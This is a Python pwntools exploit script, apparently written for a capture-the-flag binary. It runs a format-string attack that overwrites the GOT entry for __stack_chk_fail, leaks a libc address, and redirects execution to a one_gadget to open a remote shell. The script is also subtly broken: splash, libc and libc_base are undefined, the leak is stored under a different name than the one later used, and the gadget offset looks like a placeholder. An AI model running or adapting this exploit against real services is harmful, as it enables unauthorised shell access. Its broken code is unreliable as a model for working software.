from pwn import *
import sys

argv = sys.argv

DEBUG = False
BINARY = argv[1]
elf = ELF(BINARY)


context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def connect():
    if len(argv) < 3:
    	stdout = process.PTY
    	stdin = process.PTY

    	sh = process(BINARY, stdout=stdout, stdin=stdin)

    	if DEBUG:
    		attach_gdb()

    	REMOTE = False
    else:
    	NC = sys.argv[2]
    	ip = NC.split(":")[0]
    	port = int(NC.split(":")[1])
    	sh = remote(ip, port)
    	REMOTE = True
    return sh

def pause():
  programPause = input("Press the <ENTER> key to continue...")

pop_rdi = 0x4008e3
add_rsp = 0x4005d2

# Cool!
splash()

# Connect to local/remote process
sh = connect()

# 1st pass (infinite calls)
print("1st pass...")

pause()

def ret_fmt_payload(payload):
	real = b""
	real += payload
	real = real.ljust(0x120, b"A")

	# Send payload
	sh.sendlineafter("name: ", real)
	sh.recvuntil("name: ")

fmtstr = FmtStr(ret_fmt_payload, offset=6)
fmtstr.write(elf.got["__stack_chk_fail"], p64(0x4007b7))
fmtstr.execute_writes()

pause()

# 2nd pass (leak libc)
print("2nd pass...")

payload = b"%8$sAAAA" + b"B"*8*1 + p64(0x601038)[:-5]
sh.send(payload)
leak = int.from_bytes(sh.recvuntil("AAA")[6:-3], byteorder="little") - libc.symbols["printf"]
print("LIBC BASE: " + hex(leak))

pause()

# 3rd pass (hope one_gadget works)
print("3rd pass...")

one_gadget_offset = 0x1000
one_gadget_addr = libc_base + one_gadget_offset

def ret_fmt_payload(payload):
	real = b""
	real += payload
	real = real.ljust(0x120, b"A")

	# Send payload
	sh.sendlineafter("name: ", real)

fmtstr = FmtStr(ret_fmt_payload, offset=6)
fmtstr.write(elf.got["__stack_chk_fail"], p64(one_gadget_addr))
fmtstr.execute_writes()

# Open shell
sh.interactive()

